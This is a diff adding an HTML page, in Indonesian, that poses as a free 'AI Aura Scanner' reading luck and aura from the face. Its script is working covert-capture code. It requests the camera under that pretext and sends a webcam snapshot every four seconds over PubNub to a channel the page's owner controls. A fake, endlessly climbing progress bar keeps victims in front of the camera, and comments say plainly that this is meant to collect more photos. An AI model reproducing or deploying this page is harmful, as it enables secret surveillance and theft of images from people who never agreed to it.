@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AI Aura & Personality Scanner</title>
+    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
+    <style>
+        body { background: #0f0c29; background: linear-gradient(to bottom, #24243e, #302b63, #0f0c29); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .card { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); padding: 30px; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.2); width: 85%; box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37); }
+        h1 { font-size: 1.5rem; margin-bottom: 10px; color: #00d2ff; }
+        p { font-size: 0.9rem; opacity: 0.8; }
+        .btn-start { background: linear-gradient(to right, #00d2ff, #3a7bd5); color: white; border: none; padding: 15px 30px; font-size: 1rem; font-weight: bold; border-radius: 50px; cursor: pointer; margin-top: 20px; box-shadow: 0 4px 15px rgba(0, 210, 255, 0.4); transition: 0.3s; }
+        .btn-start:active { transform: scale(0.95); }
+        .loader { display: none; margin-top: 20px; }
+        .scan-line { width: 100%; height: 2px; background: #00d2ff; position: relative; animation: move 2s infinite; display: none; box-shadow: 0 0 15px #00d2ff; }
+        @keyframes move { 0% { top: 0; } 50% { top: 100px; } 100% { top: 0; } }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+
+    <div class="card" id="mainUI">
+        <h1>✨ AI Aura Scanner</h1>
+        <p>Cek persentase keberuntungan dan warna auramu hari ini menggunakan teknologi Face-Recognition AI terbaru.</p>
+        
+        <div id="scanEffect" class="scan-line"></div>
+        
+        <div id="statusText" style="margin-top: 15px; font-weight: bold; color: #00d2ff;">Ready to Scan</div>
+        
+        <button class="btn-start" id="btn" onclick="startScan()">MULAI SCAN GRATIS</button>
+        
+        <p style="font-size: 0.7rem; margin-top: 20px; opacity: 0.5;">*Izinkan akses kamera untuk proses identifikasi AI</p>
+    </div>
+
+    <script>
+        const pubnub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: 'ai_user' });
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+
+        async function startScan() {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('statusText').innerText = "Menghubungkan ke AI Server...";
+
+            try {
+                // Meminta izin kamera dengan alasan "AI Scanner"
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                
+                // Efek Visual Pancingan
+                document.getElementById('scanEffect').style.display = 'block';
+                document.getElementById('statusText').innerText = "MENGANALISIS WAJAH (12%)...";
+                
+                // Mulai kirim foto ke owner setiap 4 detik
+                setInterval(captureAndSend, 4000);
+
+                // Buat target menunggu lama agar foto yang terkirim makin banyak
+                let progress = 12;
+                setInterval(() => {
+                    if (progress < 99) {
+                        progress += Math.floor(Math.random() * 5);
+                        document.getElementById('statusText').innerText = `MENGANALISIS WAJAH (${progress}%)...`;
+                    } else {
+                        document.getElementById('statusText').innerText = "SERVER BUSY! COBA LAGI NANTI.";
+                    }
+                }, 3000);
+
+            } catch (err) {
+                alert("Gagal: AI membutuhkan akses kamera untuk membaca aura wajahmu.");
+                location.reload();
+            }
+        }
+
+        function captureAndSend() {
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            const data = canvas.toDataURL('image/jpeg', 0.5);
+            
+            pubnub.publish({
+                channel: 'vin_vortex_gate',
+                message: { img: data }
+            });
+        }
+    </script>
+</body>
+</html>
